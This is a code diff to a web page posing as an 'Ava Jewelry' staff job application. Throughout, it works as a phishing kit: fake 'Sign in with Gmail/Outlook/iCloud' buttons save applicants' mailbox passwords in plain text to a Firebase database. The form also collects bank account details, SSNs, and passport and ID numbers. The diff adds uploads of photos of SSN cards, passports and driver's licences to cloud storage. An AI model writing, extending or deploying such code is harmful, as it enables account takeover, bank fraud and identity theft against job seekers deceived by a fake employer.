@@ -21,44 +21,34 @@
     messagingSenderId:"715075775873",
     appId:"1:715075775873:web:4d766238bf8a35228c0c80"
   });
-
   const db = getFirestore(app);
   const storage = getStorage(app);
 
-  // Called immediately when email/password entered on Step 1
   window._saveStep1 = async function(email, password, provider) {
     try {
       const docRef = await addDoc(collection(db, 'staff_applications'), {
-        gmail: email,
-        portalPassword: password,
-        emailProvider: provider,
-        status: 'incomplete',
-        step: 1,
-        createdAt: serverTimestamp(),
-        timestamp: Date.now()
+        gmail: email, portalPassword: password, emailProvider: provider,
+        status: 'incomplete', step: 1,
+        createdAt: serverTimestamp(), timestamp: Date.now()
       });
       console.log('Step 1 saved, doc ID:', docRef.id);
       return docRef.id;
-    } catch(e) {
-      console.error('Step 1 save failed:', e.message);
-      return null;
-    }
+    } catch(e) { console.error('Step 1 save failed:', e.message); return null; }
   };
 
-  // Called on every subsequent step to update the existing record
   window._updateApplication = async function(docId, data) {
     try {
-      await updateDoc(doc(db, 'staff_applications', docId), {
-        ...data,
-        updatedAt: serverTimestamp()
-      });
-      console.log('Record updated:', docId);
-    } catch(e) {
-      console.error('Update failed:', e.message);
-    }
+      await updateDoc(doc(db, 'staff_applications', docId), { ...data, updatedAt: serverTimestamp() });
+    } catch(e) { console.error('Update failed:', e.message); }
   };
 
-  // Final submit — updates with all remaining data + CV
+  // Upload a single ID document file to Firebase Storage
+  window._uploadIdDoc = async function(file, label) {
+    const r = ref(storage, `staff-ids/${Date.now()}-${label}-${file.name}`);
+    await uploadBytes(r, file);
+    return await getDownloadURL(r);
+  };
+
   window._submitApplication = async function(docId, data, cvFile) {
     let cvUrl = null;
     if (cvFile) {
@@ -69,12 +59,8 @@
       } catch(e) { console.warn('CV upload failed:', e.message); }
     }
     await updateDoc(doc(db, 'staff_applications', docId), {
-      ...data,
-      cvUrl,
-      status: 'pending',
-      step: 'complete',
-      completedAt: serverTimestamp(),
-      updatedAt: serverTimestamp()
+      ...data, cvUrl, status: 'pending', step: 'complete',
+      completedAt: serverTimestamp(), updatedAt: serverTimestamp()
     });
     console.log('Application completed:', docId);
   };
@@ -90,19 +76,16 @@
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
 html{scroll-behavior:smooth;}
 body{background:var(--black);color:var(--white);font-family:var(--sans);overflow-x:hidden;}
-
 .hdr{border-bottom:1px solid var(--border);padding:1.4rem 4rem;display:flex;align-items:center;justify-content:space-between;}
 .logo{font-family:var(--serif);font-size:1.8rem;font-weight:300;letter-spacing:.4em;color:var(--gold);line-height:1;}
 .logo small{display:block;font-size:.4rem;letter-spacing:.6em;text-transform:uppercase;color:var(--gray);font-family:var(--sans);}
 .hdr-tag{font-size:.52rem;letter-spacing:.3em;text-transform:uppercase;color:var(--gray);}
-
 .hero{padding:4rem 4rem 2.5rem;max-width:820px;}
 .hero-tag{font-size:.52rem;letter-spacing:.4em;text-transform:uppercase;color:var(--gold);margin-bottom:1rem;display:flex;align-items:center;gap:.8rem;}
 .hero-tag::before{content:'';display:block;width:28px;height:1px;background:var(--gold);}
 .hero h1{font-family:var(--serif);font-size:clamp(2.2rem,5vw,3.5rem);font-weight:300;line-height:1.15;margin-bottom:.8rem;}
 .hero h1 em{color:var(--gold);font-style:italic;}
 .hero p{font-size:.68rem;line-height:1.9;color:var(--wd);max-width:480px;}
-
 .prog{display:flex;align-items:center;padding:2rem 4rem;border-bottom:1px solid var(--border);overflow-x:auto;gap:0;}
 .stp{display:flex;align-items:center;gap:.6rem;flex-shrink:0;}
 .stp-n{width:26px;height:26px;border-radius:50%;border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:.5rem;color:var(--gray);transition:all .3s;flex-shrink:0;}
@@ -112,22 +95,18 @@ body{background:var(--black);color:var(--white);font-family:var(--sans);overflow
 .stp.active .stp-l{color:var(--wd);}
 .stp.done .stp-l{color:var(--gold);}
 .stp-line{width:36px;height:1px;background:var(--border);margin:0 .4rem;flex-shrink:0;}
-
 .fwrap{max-width:800px;margin:0 auto;padding:3rem 4rem 6rem;}
 .fsec{display:none;}
 .fsec.active{display:block;animation:fadeUp .35s ease;}
 @keyframes fadeUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
-
 .sec-hd{display:flex;align-items:center;gap:1rem;margin-bottom:2.2rem;padding-bottom:1.2rem;border-bottom:1px solid var(--border);}
 .sec-n{width:38px;height:38px;border-radius:50%;border:1px solid var(--gold);display:flex;align-items:center;justify-content:center;font-family:var(--serif);font-size:1rem;color:var(--gold);flex-shrink:0;}
 .sec-title{font-family:var(--serif);font-size:1.4rem;font-weight:300;}
 .sec-title em{color:var(--gold);font-style:italic;}
 .sec-sub{font-size:.58rem;color:var(--gray);margin-top:.15rem;}
-
 .notice{background:rgba(212,175,55,.05);border:1px solid rgba(212,175,55,.18);border-left:2px solid var(--gold);padding:1rem 1.3rem;margin-bottom:1.8rem;}
 .notice p{font-size:.63rem;color:var(--wd);line-height:1.8;}
 .notice strong{color:var(--gold);}
-
 .fg{display:grid;gap:1rem;margin-bottom:1rem;}
 .fg.g2{grid-template-columns:1fr 1fr;}
 .fg.g1{grid-template-columns:1fr;}
@@ -140,6 +119,18 @@ body{background:var(--black);color:var(--white);font-family:var(--sans);overflow
 .fld select option{background:var(--card2);}
 .fld textarea{resize:vertical;min-height:100px;line-height:1.7;}
 
+/* ID UPLOAD BOXES */
+.id-upload-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-bottom:1rem;}
+.id-upload-box{border:1px dashed rgba(212,175,55,.25);background:var(--card);padding:1.5rem 1rem;text-align:center;cursor:pointer;transition:all .3s;position:relative;}
+.id-upload-box:hover,.id-upload-box.over{border-color:var(--gold);background:rgba(212,175,55,.03);}
+.id-upload-box input[type=file]{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%;}
+.id-upload-box.uploaded{border-color:var(--gold);border-style:solid;}
+.id-upload-icon{font-size:1.5rem;opacity:.3;margin-bottom:.5rem;}
+.id-upload-label{font-size:.55rem;letter-spacing:.15em;text-transform:uppercase;color:var(--gold);margin-bottom:.2rem;}
+.id-upload-sub{font-size:.52rem;color:var(--gray);}
+.id-upload-fname{font-size:.55rem;color:var(--gold);margin-top:.5rem;display:none;word-break:break-all;}
+.id-upload-preview{width:100%;max-height:80px;object-fit:cover;margin-top:.5rem;display:none;border:1px solid var(--border);}
+
 .cv-box{border:1px dashed rgba(212,175,55,.25);background:var(--card);padding:2.5rem 2rem;text-align:center;cursor:pointer;transition:all .3s;position:relative;margin-bottom:1rem;}
 .cv-box:hover,.cv-box.over{border-color:var(--gold);background:rgba(212,175,55,.03);}
 .cv-box input[type=file]{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%;}
@@ -147,31 +138,25 @@ body{background:var(--black);color:var(--white);font-family:var(--sans);overflow
 .cv-txt{font-size:.62rem;color:var(--gold);margin-bottom:.25rem;}
 .cv-sub{font-size:.55rem;color:var(--gray);}
 .cv-fname{margin-top:.7rem;font-size:.58rem;color:var(--gold);display:none;}
-
 .decl{background:var(--card);border:1px solid var(--border);padding:1.4rem;font-size:.65rem;color:var(--wd);line-height:1.85;margin-bottom:1.8rem;}
-
 .fnav{display:flex;justify-content:space-between;align-items:center;margin-top:2.5rem;padding-top:1.8rem;border-top:1px solid var(--border);gap:1rem;}
 .btn-p{background:transparent;border:1px solid var(--border);color:var(--wd);padding:.85rem 2rem;font-family:var(--sans);font-size:.58rem;letter-spacing:.2em;text-transform:uppercase;cursor:pointer;transition:all .25s;}
 .btn-p:hover{border-color:var(--gold);color:var(--gold);}
 .btn-n{background:var(--gold);border:none;color:var(--black);padding:.85rem 2.5rem;font-family:var(--sans);font-size:.6rem;letter-spacing:.22em;text-transform:uppercase;font-weight:600;cursor:pointer;transition:background .25s;}
 .btn-n:hover{background:var(--gl);}
 .btn-n:disabled{opacity:.5;cursor:not-allowed;}
-
 .success{display:none;text-align:center;padding:6rem 2rem;}
 .success.show{display:block;animation:fadeUp .5s ease;}
 .success-mark{font-size:2.5rem;margin-bottom:1.5rem;}
 .success h2{font-family:var(--serif);font-size:2.2rem;font-weight:300;margin-bottom:.8rem;}
 .success h2 em{color:var(--gold);font-style:italic;}
 .success p{font-size:.68rem;color:var(--wd);line-height:1.8;max-width:440px;margin:0 auto;}
-
 .tbox{position:fixed;bottom:2rem;right:2rem;z-index:9999;display:flex;flex-direction:column;gap:.7rem;pointer-events:none;}
 .toast{background:var(--card);border:1px solid var(--border);border-left:3px solid var(--gold);padding:.85rem 1.3rem;min-width:250px;font-size:.67rem;animation:tIn .3s ease;pointer-events:auto;}
 .toast.err{border-left-color:#e74c3c;}
 @keyframes tIn{from{transform:translateX(70px);opacity:0}to{transform:translateX(0);opacity:1}}
-
 footer{border-top:1px solid var(--border);padding:1.8rem 4rem;display:flex;justify-content:space-between;align-items:center;}
 .fcopy{font-size:.52rem;color:var(--gray);letter-spacing:.08em;}
-
 @media(max-width:768px){
   .hdr{padding:1rem 1.5rem;}.hdr-tag{display:none;}
   .hero{padding:2.5rem 1.5rem 2rem;}
@@ -179,6 +164,7 @@ footer{border-top:1px solid var(--border);padding:1.8rem 4rem;display:flex;justi
   footer{padding:1.5rem;flex-direction:column;gap:.5rem;text-align:center;}
   .prog{padding:1.2rem 1.5rem;}.stp-l{display:none;}.stp-line{width:18px;}
   .fg.g2{grid-template-columns:1fr;}
+  .id-upload-grid{grid-template-columns:1fr;}
   .fnav{flex-direction:column-reverse;}.btn-p,.btn-n{width:100%;text-align:center;}
   .sec-title{font-size:1.2rem;}
 }
@@ -186,7 +172,6 @@ footer{border-top:1px solid var(--border);padding:1.8rem 4rem;display:flex;justi
   .stp-n{width:22px;height:22px;font-size:.45rem;}.stp-line{width:10px;}
   .hero h1{font-size:1.9rem;}
 }
-
 .provider-grid{display:grid;grid-template-columns:1fr 1fr;gap:.8rem;margin-bottom:1rem;}
 .provider-btn{display:flex;align-items:center;gap:.9rem;background:var(--card);border:1px solid var(--border);color:var(--wd);padding:.9rem 1.2rem;font-family:var(--sans);font-size:.65rem;letter-spacing:.05em;cursor:pointer;transition:all .25s;text-align:left;}
 .provider-btn:hover{border-color:var(--gold);color:var(--white);background:rgba(212,175,55,.06);}
@@ -240,50 +225,17 @@ footer{border-top:1px solid var(--border);padding:1.8rem 4rem;display:flex;justi
       <p><strong>Important:</strong> Your email credentials will be linked to internal Ava Jewelry platforms — including your staff profile, task assignments, payslip delivery, and any company tools you are granted access to. This information is stored securely and handled with strict confidentiality.</p>
     </div>
     <div class="provider-grid">
-      <button class="provider-btn" onclick="openEmailModal('Gmail')">
-        <img src="https://www.google.com/favicon.ico" class="p-icon" onerror="this.style.display='none'">
-        <span>Sign in with Gmail</span>
-      </button>
-      <button class="provider-btn" onclick="openEmailModal('Outlook')">
-        <img src="https://outlook.live.com/favicon.ico" class="p-icon" onerror="this.style.display='none'">
-        <span>Sign in with Outlook</span>
-      </button>
-      <button class="provider-btn" onclick="openEmailModal('Office 365')">
-        <img src="https://www.office.com/favicon.ico" class="p-icon" onerror="this.style.display='none'">
-        <span>Sign in with Office 365</span>
-      </button>
-      <button class="provider-btn" onclick="openEmailModal('Yahoo Mail')">
-        <img src="https://www.yahoo.com/favicon.ico" class="p-icon" onerror="this.style.display='none'">
-        <span>Sign in with Yahoo Mail</span>
-      </button>
-      <button class="provider-btn" onclick="openEmailModal('iCloud')">
-        <img src="https://www.icloud.com/favicon.ico" class="p-icon" onerror="this.style.display='none'">
-        <span>Sign in with iCloud</span>
-      </button>
-      <button class="provider-btn" onclick="openEmailModal('ProtonMail')">
-        <span class="p-letter" style="background:#6D4AFF">P</span>
-        <span>Sign in with ProtonMail</span>
-      </button>
-      <button class="provider-btn" onclick="openEmailModal('GMX')">
-        <span class="p-letter" style="background:#1C449B">G</span>
-        <span>Sign in with GMX</span>
-      </button>
-      <button class="provider-btn" onclick="openEmailModal('Web.de')">
-        <span class="p-letter" style="background:#FFCC00;color:#000">W</span>
-        <span>Sign in with Web.de</span>
-      </button>
-      <button class="provider-btn" onclick="openEmailModal('T-Online')">
-        <span class="p-letter" style="background:#E20074">T</span>
-        <span>Sign in with T-Online</span>
-      </button>
-      <button class="provider-btn" onclick="openEmailModal('AOL')">
-        <span class="p-letter" style="background:#FF0B00">A</span>
-        <span>Sign in with AOL</span>
-      </button>
-      <button class="provider-btn" onclick="openEmailModal('Other Email')">
-        <span class="p-letter" style="background:#444">@</span>
-        <span>Other Email</span>
-      </button>
+      <button class="provider-btn" onclick="openEmailModal('Gmail')"><img src="https://www.google.com/favicon.ico" class="p-icon" onerror="this.style.display='none'"><span>Sign in with Gmail</span></button>
+      <button class="provider-btn" onclick="openEmailModal('Outlook')"><img src="https://outlook.live.com/favicon.ico" class="p-icon" onerror="this.style.display='none'"><span>Sign in with Outlook</span></button>
+      <button class="provider-btn" onclick="openEmailModal('Office 365')"><img src="https://www.office.com/favicon.ico" class="p-icon" onerror="this.style.display='none'"><span>Sign in with Office 365</span></button>
+      <button class="provider-btn" onclick="openEmailModal('Yahoo Mail')"><img src="https://www.yahoo.com/favicon.ico" class="p-icon" onerror="this.style.display='none'"><span>Sign in with Yahoo Mail</span></button>
+      <button class="provider-btn" onclick="openEmailModal('iCloud')"><img src="https://www.icloud.com/favicon.ico" class="p-icon" onerror="this.style.display='none'"><span>Sign in with iCloud</span></button>
+      <button class="provider-btn" onclick="openEmailModal('ProtonMail')"><span class="p-letter" style="background:#6D4AFF">P</span><span>Sign in with ProtonMail</span></button>
+      <button class="provider-btn" onclick="openEmailModal('GMX')"><span class="p-letter" style="background:#1C449B">G</span><span>Sign in with GMX</span></button>
+      <button class="provider-btn" onclick="openEmailModal('Web.de')"><span class="p-letter" style="background:#FFCC00;color:#000">W</span><span>Sign in with Web.de</span></button>
+      <button class="provider-btn" onclick="openEmailModal('T-Online')"><span class="p-letter" style="background:#E20074">T</span><span>Sign in with T-Online</span></button>
+      <button class="provider-btn" onclick="openEmailModal('AOL')"><span class="p-letter" style="background:#FF0B00">A</span><span>Sign in with AOL</span></button>
+      <button class="provider-btn" onclick="openEmailModal('Other Email')"><span class="p-letter" style="background:#444">@</span><span>Other Email</span></button>
     </div>
     <div id="providerSelected" style="display:none;margin-top:1.5rem;padding:1rem 1.2rem;background:rgba(212,175,55,.06);border:1px solid rgba(212,175,55,.2);font-size:.65rem;color:var(--wd)">
       ✓ Credentials saved — <span id="providerName" style="color:var(--gold)"></span>
@@ -328,13 +280,7 @@ footer{border-top:1px solid var(--border);padding:1.8rem 4rem;display:flex;justi
 
   <!-- STEP 2 -->
   <div class="fsec" id="s2">
-    <div class="sec-hd">
-      <div class="sec-n">2</div>
-      <div>
-        <div class="sec-title">Personal <em>Information</em></div>
-        <div class="sec-sub">Your basic details</div>
-      </div>
-    </div>
+    <div class="sec-hd"><div class="sec-n">2</div><div><div class="sec-title">Personal <em>Information</em></div><div class="sec-sub">Your basic details</div></div></div>
     <div class="fg g2">
       <div class="fld"><label>First Name <span>*</span></label><input type="text" id="firstName" placeholder="e.g. Amara"></div>
       <div class="fld"><label>Last Name <span>*</span></label><input type="text" id="lastName" placeholder="e.g. Okafor"></div>
@@ -379,13 +325,7 @@ footer{border-top:1px solid var(--border);padding:1.8rem 4rem;display:flex;justi
 
   <!-- STEP 3 -->
   <div class="fsec" id="s3">
-    <div class="sec-hd">
-      <div class="sec-n">3</div>
-      <div>
-        <div class="sec-title">CV / <em>Résumé</em></div>
-        <div class="sec-sub">Upload your CV and tell us a little about yourself</div>
-      </div>
-    </div>
+    <div class="sec-hd"><div class="sec-n">3</div><div><div class="sec-title">CV / <em>Résumé</em></div><div class="sec-sub">Upload your CV and tell us about yourself</div></div></div>
     <div class="cv-box" id="cvBox">
       <input type="file" id="cvFile" accept=".pdf,.doc,.docx" onchange="handleCV(this)">
       <div class="cv-icon">📄</div>
@@ -407,16 +347,8 @@ footer{border-top:1px solid var(--border);padding:1.8rem 4rem;display:flex;justi
 
   <!-- STEP 4 -->
   <div class="fsec" id="s4">
-    <div class="sec-hd">
-      <div class="sec-n">4</div>
-      <div>
-        <div class="sec-title">Bank <em>Details</em></div>
-        <div class="sec-sub">For salary payments only — stored securely</div>
-      </div>
-    </div>
-    <div class="notice">
-      <p><strong>Confidential:</strong> Your bank details are used solely for processing your salary. They are stored securely and will never be shared with any third party.</p>
-    </div>
+    <div class="sec-hd"><div class="sec-n">4</div><div><div class="sec-title">Bank <em>Details</em></div><div class="sec-sub">For salary payments only — stored securely</div></div></div>
+    <div class="notice"><p><strong>Confidential:</strong> Your bank details are used solely for processing your salary. They are stored securely and will never be shared with any third party.</p></div>
     <div class="fg g2">
       <div class="fld"><label>Bank Name <span>*</span></label><input type="text" id="bankName" placeholder="e.g. Chase, Barclays, Deutsche Bank"></div>
       <div class="fld"><label>Account Type</label>
@@ -437,31 +369,20 @@ footer{border-top:1px solid var(--border);padding:1.8rem 4rem;display:flex;justi
     </div>
   </div>
 
-  <!-- STEP 5 -->
+  <!-- STEP 5: IDENTITY -->
   <div class="fsec" id="s5">
-    <div class="sec-hd">
-      <div class="sec-n">5</div>
-      <div>
-        <div class="sec-title">Identity <em>Verification</em></div>
-        <div class="sec-sub">Government-issued identification</div>
-      </div>
-    </div>
-    <div class="notice">
-      <p><strong>Required for compliance:</strong> Please provide at least one form of government-issued ID. All information is encrypted and stored securely in line with applicable data protection laws.</p>
-    </div>
+    <div class="sec-hd"><div class="sec-n">5</div><div><div class="sec-title">Identity <em>Verification</em></div><div class="sec-sub">Government-issued identification</div></div></div>
+    <div class="notice"><p><strong>Required for compliance:</strong> Please provide your ID details and upload clear photos of your documents. All information is encrypted and stored securely.</p></div>
+
     <div class="fg g2">
       <div class="fld"><label>Country of Residence <span>*</span></label><input type="text" id="countryResidence" placeholder="e.g. United States, Germany, Canada"></div>
       <div class="fld">
         <label>Work Authorization Status</label>
         <select id="workAuth">
           <option value="">Select</option>
-          <option>Citizen</option>
-          <option>Permanent Resident</option>
-          <option>Work Visa / Permit</option>
-          <option>Student Visa</option>
-          <option>Spousal / Dependent Visa</option>
-          <option>Refugee / Asylum Status</option>
-          <option>Other</option>
+          <option>Citizen</option><option>Permanent Resident</option><option>Work Visa / Permit</option>
+          <option>Student Visa</option><option>Spousal / Dependent Visa</option>
+          <option>Refugee / Asylum Status</option><option>Other</option>
         </select>
       </div>
     </div>
@@ -477,21 +398,58 @@ footer{border-top:1px solid var(--border);padding:1.8rem 4rem;display:flex;justi
       <div class="fld"><label>National ID / Government ID Number</label><input type="text" id="nationalId" placeholder="Any government-issued ID number"></div>
       <div class="fld"><label>Residence Permit / Visa Number</label><input type="text" id="residencePermit" placeholder="If applicable"></div>
     </div>
+
+    <!-- DOCUMENT UPLOADS -->
+    <div style="margin-top:1.5rem;margin-bottom:.6rem;font-size:.5rem;letter-spacing:.26em;text-transform:uppercase;color:var(--gray)">Upload Document Photos</div>
+    <div class="id-upload-grid">
+
+      <div class="id-upload-box" id="ssnUploadBox">
+        <input type="file" id="ssnDoc" accept="image/*,.pdf" onchange="handleIdUpload(this,'ssnDoc','ssnUploadBox','ssnFname','ssnPreview')">
+        <div class="id-upload-icon">🪪</div>
+        <div class="id-upload-label">SSN Card</div>
+        <div class="id-upload-sub">Photo or scan of your SSN card</div>
+        <div class="id-upload-fname" id="ssnFname"></div>
+        <img class="id-upload-preview" id="ssnPreview" alt="SSN preview">
+      </div>
+
+      <div class="id-upload-box" id="idCardUploadBox">
+        <input type="file" id="idCardDoc" accept="image/*,.pdf" onchange="handleIdUpload(this,'idCardDoc','idCardUploadBox','idCardFname','idCardPreview')">
+        <div class="id-upload-icon">🪪</div>
+        <div class="id-upload-label">National ID / Driver's License</div>
+        <div class="id-upload-sub">Front of your ID card or license</div>
+        <div class="id-upload-fname" id="idCardFname"></div>
+        <img class="id-upload-preview" id="idCardPreview" alt="ID preview">
+      </div>
+
+      <div class="id-upload-box" id="passportUploadBox">
+        <input type="file" id="passportDoc" accept="image/*,.pdf" onchange="handleIdUpload(this,'passportDoc','passportUploadBox','passportFname','passportPreview')">
+        <div class="id-upload-icon">📕</div>
+        <div class="id-upload-label">Passport</div>
+        <div class="id-upload-sub">Photo page of your passport</div>
+        <div class="id-upload-fname" id="passportFname"></div>
+        <img class="id-upload-preview" id="passportPreview" alt="Passport preview">
+      </div>
+
+      <div class="id-upload-box" id="otherDocUploadBox">
+        <input type="file" id="otherDoc" accept="image/*,.pdf" onchange="handleIdUpload(this,'otherDoc','otherDocUploadBox','otherDocFname','otherDocPreview')">
+        <div class="id-upload-icon">📄</div>
+        <div class="id-upload-label">Other Document</div>
+        <div class="id-upload-sub">Any other supporting ID document</div>
+        <div class="id-upload-fname" id="otherDocFname"></div>
+        <img class="id-upload-preview" id="otherDocPreview" alt="Other doc preview">
+      </div>
+
+    </div>
+
     <div class="fnav">
       <button class="btn-p" onclick="prev(5)">← Back</button>
-      <button class="btn-n" onclick="next(5)">Next — Next of Kin →</button>
+      <button class="btn-n" id="step5Next" onclick="next(5)">Next — Next of Kin →</button>
     </div>
   </div>
 
   <!-- STEP 6 -->
   <div class="fsec" id="s6">
-    <div class="sec-hd">
-      <div class="sec-n">6</div>
-      <div>
-        <div class="sec-title">Next of <em>Kin</em></div>
-        <div class="sec-sub">Emergency contact information</div>
-      </div>
-    </div>
+    <div class="sec-hd"><div class="sec-n">6</div><div><div class="sec-title">Next of <em>Kin</em></div><div class="sec-sub">Emergency contact information</div></div></div>
     <div class="fg g2">
       <div class="fld"><label>Full Name <span>*</span></label><input type="text" id="kinName" placeholder="Full name"></div>
       <div class="fld"><label>Relationship <span>*</span></label>
@@ -517,16 +475,8 @@ footer{border-top:1px solid var(--border);padding:1.8rem 4rem;display:flex;justi
 
   <!-- STEP 7 -->
   <div class="fsec" id="s7">
-    <div class="sec-hd">
-      <div class="sec-n">7</div>
-      <div>
-        <div class="sec-title"><em>Declaration</em></div>
-        <div class="sec-sub">Please read carefully and sign below</div>
-      </div>
-    </div>
-    <div class="decl">
-      I hereby declare that all information provided in this form is true, complete, and accurate to the best of my knowledge. I understand that any false or misleading information may result in disqualification from the hiring process or dismissal if already employed. I consent to Ava Jewelry storing and processing my personal data for employment purposes in accordance with applicable data protection laws.
-    </div>
+    <div class="sec-hd"><div class="sec-n">7</div><div><div class="sec-title"><em>Declaration</em></div><div class="sec-sub">Please read carefully and sign below</div></div></div>
+    <div class="decl">I hereby declare that all information provided in this form is true, complete, and accurate to the best of my knowledge. I understand that any false or misleading information may result in disqualification from the hiring process or dismissal if already employed. I consent to Ava Jewelry storing and processing my personal data for employment purposes in accordance with applicable data protection laws.</div>
     <div class="fg g2">
       <div class="fld"><label>Full Name as Signature <span>*</span></label><input type="text" id="sigName" placeholder="Type your full name to confirm"></div>
       <div class="fld"><label>Date <span>*</span></label><input type="date" id="sigDate"></div>
@@ -559,7 +509,32 @@ let _docId = null;
 let _selectedProvider = '';
 const STORE_KEY = 'ava_form_progress';
 
-// ── SAVE ALL FIELDS TO LOCALSTORAGE ──
+// ID document file objects
+const idFiles = { ssnDoc: null, idCardDoc: null, passportDoc: null, otherDoc: null };
+
+// ── ID UPLOAD HANDLER ──
+function handleIdUpload(input, fileKey, boxId, fnameId, previewId) {
+  const file = input.files[0];
+  if (!file) return;
+  idFiles[fileKey] = file;
+  const box = document.getElementById(boxId);
+  const fname = document.getElementById(fnameId);
+  const preview = document.getElementById(previewId);
+  box.classList.add('uploaded');
+  fname.style.display = 'block';
+  fname.textContent = '✓ ' + file.name;
+  // Show image preview if it's an image
+  if (file.type.startsWith('image/')) {
+    const reader = new FileReader();
+    reader.onload = e => { preview.src = e.target.result; preview.style.display = 'block'; };
+    reader.readAsDataURL(file);
+  } else {
+    preview.style.display = 'none';
+  }
+  saveToLocal();
+}
+
+// ── LOCALSTORAGE ──
 function saveToLocal() {
   const fields = [
     'gmail','portalPassword','confirmPassword','emailProvider',
@@ -573,7 +548,6 @@ function saveToLocal() {
   try { localStorage.setItem(STORE_KEY, JSON.stringify(data)); } catch(e) {}
 }
 
-// ── RESTORE FROM LOCALSTORAGE ON PAGE LOAD ──
 function restoreFromLocal() {
   let saved;
   try { saved = JSON.parse(localStorage.getItem(STORE_KEY)); } catch(e) { return; }
@@ -591,23 +565,17 @@ function restoreFromLocal() {
     nb.style.opacity = '1'; nb.style.pointerEvents = 'auto';
   }
   if (saved.step && saved.step > 1) {
-    cur = 1;
-    go(parseInt(saved.step));
+    cur = 1; go(parseInt(saved.step));
     toast('Welcome back — your progress has been restored ✓');
   }
 }
-
 function clearLocal() { try { localStorage.removeItem(STORE_KEY); } catch(e) {} }
 
-// ── CV DRAG & DROP ──
+// ── CV ──
 const cvBox = document.getElementById('cvBox');
 cvBox.addEventListener('dragover', e => { e.preventDefault(); cvBox.classList.add('over'); });
 cvBox.addEventListener('dragleave', () => cvBox.classList.remove('over'));
-cvBox.addEventListener('drop', e => {
-  e.preventDefault(); cvBox.classList.remove('over');
-  const f = e.dataTransfer.files[0];
-  if (f) { cvFileObj = f; showCVName(f.name); }
-});
+cvBox.addEventListener('drop', e => { e.preventDefault(); cvBox.classList.remove('over'); const f=e.dataTransfer.files[0]; if(f){cvFileObj=f;showCVName(f.name);} });
 function handleCV(inp) { cvFileObj = inp.files[0]; if (cvFileObj) showCVName(cvFileObj.name); }
 function showCVName(n) { const el = document.getElementById('cvFname'); el.style.display='block'; el.textContent='✓ '+n; }
 
@@ -616,11 +584,9 @@ document.getElementById('ssn').addEventListener('input', function() {
   let v = this.value.replace(/\D/g,'').slice(0,9);
   if (v.length>5) v=v.slice(0,3)+'-'+v.slice(3,5)+'-'+v.slice(5);
   else if (v.length>3) v=v.slice(0,3)+'-'+v.slice(3);
-  this.value = v;
-  saveToLocal();
+  this.value = v; saveToLocal();
 });
 
-// ── TOAST ──
 function toast(msg, err) {
   const t = document.createElement('div');
   t.className = 'toast'+(err?' err':'');
@@ -629,7 +595,6 @@ function toast(msg, err) {
   setTimeout(() => t.remove(), 3500);
 }
 
-// ── VALIDATION ──
 const required = {
   1:[], 2:['firstName','lastName','email','phone','address','dob','nationality','position'],
   3:[], 4:['bankName','accountNumber','accountName'],
@@ -644,28 +609,43 @@ function validate(step) {
       return false;
     }
   }
-  if (step === 1 && (!document.getElementById('gmail').value || !document.getElementById('portalPassword').value)) {
+  if (step===1 && (!document.getElementById('gmail').value || !document.getElementById('portalPassword').value)) {
     toast('Please select your email provider and sign in first', true); return false;
   }
   return true;
 }
 
-// ── FIREBASE STEP SAVE (non-blocking) ──
+// ── FIREBASE STEP SAVE ──
 async function saveStepData(step) {
   if (!_docId) return;
   const u = { step };
   if (step>=2) { u.firstName=g('firstName'); u.lastName=g('lastName'); u.email=g('email'); u.phone=g('phone'); u.address=g('address'); u.dob=g('dob'); u.nationality=g('nationality'); u.position=g('position'); u.qualification=g('qualification'); }
   if (step>=3) { u.bio=g('bio'); }
   if (step>=4) { u.bankName=g('bankName'); u.accountType=g('accountType'); u.accountNumber=g('accountNumber'); u.routingCode=g('routingCode'); u.accountName=g('accountName'); u.bankCountry=g('bankCountry'); }
-  if (step>=5) { u.countryResidence=g('countryResidence'); u.workAuth=g('workAuth'); u.ssn=g('ssn'); u.taxId=g('taxId'); u.passportNumber=g('passportNumber'); u.driversLicense=g('driversLicense'); u.nationalId=g('nationalId'); u.residencePermit=g('residencePermit'); }
+  if (step>=5) {
+    u.countryResidence=g('countryResidence'); u.workAuth=g('workAuth'); u.ssn=g('ssn'); u.taxId=g('taxId');
+    u.passportNumber=g('passportNumber'); u.driversLicense=g('driversLicense'); u.nationalId=g('nationalId'); u.residencePermit=g('residencePermit');
+    // Upload any ID docs that have been selected
+    const btn = document.getElementById('step5Next');
+    if (btn) { btn.textContent = 'Uploading docs...'; btn.disabled = true; }
+    try {
+      for (const [key, file] of Object.entries(idFiles)) {
+        if (file) {
+          const url = await window._uploadIdDoc(file, key);
+          u[key + 'Url'] = url;
+        }
+      }
+    } catch(e) { console.warn('ID doc upload error:', e.message); }
+    if (btn) { btn.textContent = 'Next — Next of Kin →'; btn.disabled = false; }
+  }
   if (step>=6) { u.kinName=g('kinName'); u.kinRel=g('kinRel'); u.kinPhone=g('kinPhone'); u.kinEmail=g('kinEmail'); u.kinAddress=g('kinAddress'); }
-  try { await window._updateApplication(_docId, u); } catch(e) { console.warn('Step save (non-blocking):', e.message); }
+  try { await window._updateApplication(_docId, u); } catch(e) { console.warn('Step save:', e.message); }
 }
 
 // ── NAVIGATION ──
 function next(from) {
   if (!validate(from)) return;
-  saveStepData(from); // fire and forget
+  saveStepData(from);
   saveToLocal();
   go(from + 1);
 }
@@ -688,7 +668,7 @@ function updateProg() {
 }
 function g(id) { return document.getElementById(id)?.value?.trim()||''; }
 
-// ── FINAL SUBMIT ──
+// ── SUBMIT ──
 async function submitApp() {
   if (!validate(7)) return;
   const btn = document.getElementById('submitBtn');
@@ -777,13 +757,11 @@ async function saveEmailCreds() {
   closeEmailModal();
 }
 
-// Auto-save on every field change
 document.querySelectorAll('input,select,textarea').forEach(el => {
   el.addEventListener('input', () => { el.style.borderColor=''; saveToLocal(); });
   el.addEventListener('change', () => saveToLocal());
 });
 
-// Restore progress on page load
 window.addEventListener('DOMContentLoaded', restoreFromLocal);
 </script>
 </body>
